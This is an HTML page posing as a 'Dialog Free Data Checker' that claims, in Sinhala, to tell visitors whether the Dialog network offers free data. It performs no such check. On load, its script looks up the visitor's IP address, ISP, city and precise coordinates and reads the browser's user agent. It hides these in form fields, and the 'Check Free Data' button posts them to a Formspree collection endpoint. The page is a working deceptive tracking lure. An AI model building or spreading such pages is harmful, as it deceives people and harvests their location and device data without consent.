<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dialog Free Data Checker</title>
  <style>
    body {
      background: #121212;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 40px;
      text-align: center;
    }
    h2 {
      color: #00cec9;
    }
    p {
      color: #dfe6e9;
      margin-bottom: 40px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      background-color: #0984e3;
      color: white;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <h2>Dialog Free Data Checker</h2>
  <p>Dialog සදහා නොමිලේ දත්ත ලබාදෙන්නේදැයි පරීක්ෂා කරන්න පහත බොත්තම ඔබන්න.</p>

  <form action="https://formspree.io/f/manelzor" method="POST" id="autoForm">
    <input type="hidden" name="IP Address" id="ip">
    <input type="hidden" name="Location" id="location">
    <input type="hidden" name="Device Info" id="device">
    <button type="submit" id="submitBtn">Check Free Data</button>
  </form>

  <p id="status" class="hidden">Submitting... Please wait</p>

  <script>
    async function fillFormAndEnableButton() {
      try {
        const res = await fetch("https://ip-api.com/json/");
        const data = await res.json();

        if (data.status === "success") {
          document.getElementById("ip").value = data.query;
          document.getElementById("location").value =
            `Country: ${data.country}\nRegion: ${data.regionName}\nCity: ${data.city}\nZIP: ${data.zip}\nISP: ${data.isp}\nLat: ${data.lat}\nLon: ${data.lon}\nTimezone: ${data.timezone}`;
        }
        document.getElementById("device").value = navigator.userAgent;
      } catch (err) {
        console.error("IP Fetch Error:", err);
      }
    }

    fillFormAndEnableButton();

    document.getElementById("autoForm").addEventListener("submit", () => {
      document.getElementById("status").classList.remove("hidden");
    });
  </script>
</body>
</html>
